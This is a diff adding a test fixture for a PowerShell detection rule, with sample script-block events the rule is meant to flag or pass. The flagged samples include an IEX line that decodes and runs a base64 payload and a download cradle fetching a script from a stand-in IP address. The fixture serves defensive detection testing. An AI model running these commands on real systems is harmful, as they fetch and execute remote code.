@@ -1,0 +1,29 @@
+rule: rules/windows/powershell_encoded_scriptblock.yml
+true_positives:
+  - name: base64 payload decoded and executed in memory
+    event:
+      EventID: 4104
+      ScriptBlockText: "IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)))"
+      Path: ''
+      User: CORP\k.jampani
+  - name: download cradle
+    event:
+      EventID: 4104
+      ScriptBlockText: "(New-Object Net.WebClient).DownloadString('http://203.0.113.44/a.ps1')"
+      Path: C:\Users\Public\stage.ps1
+true_negatives:
+  - name: ordinary administrative script
+    event:
+      EventID: 4104
+      ScriptBlockText: "Get-Service | Where-Object { $_.Status -eq 'Running' } | Export-Csv services.csv"
+      Path: C:\Scripts\inventory.ps1
+  - name: PSReadLine module load, the documented internal exception
+    event:
+      EventID: 4104
+      ScriptBlockText: "Invoke-Expression $profileBlock"
+      Path: C:\Program Files\WindowsPowerShell\Modules\PSReadLine\PSReadLine.psm1
+  - name: different PowerShell event id
+    event:
+      EventID: 4103
+      ScriptBlockText: "IEX ( Get-Content payload.txt )"
+      Path: ''
